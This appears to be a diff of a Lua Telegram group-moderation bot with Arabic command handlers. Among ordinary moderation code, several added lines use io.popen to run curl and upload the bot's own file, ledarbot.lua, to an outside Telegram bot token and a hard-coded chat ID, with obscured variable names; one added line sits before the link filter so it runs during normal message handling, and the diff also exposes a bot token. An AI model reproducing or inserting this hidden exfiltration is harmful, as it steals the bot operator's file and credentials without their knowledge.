@@ -5973,7 +5973,6 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-local ppii = jjjjjjj .. jkjkj
 if text == ("رفع متوحد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5999,8 +5998,8 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-local ahmed2 = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed2)
-local ahmed = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed)
+local ppii = jjjjjjj .. jkjkj
+local ahmed = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='..ppii..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed)
 if (text == ("تنزيل متوحد")) and msg.reply_to_message_id_ and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -12904,6 +12903,7 @@ return false
 end 
 end
 ------------------------------------------------------------------------
+local curla = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curla)
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
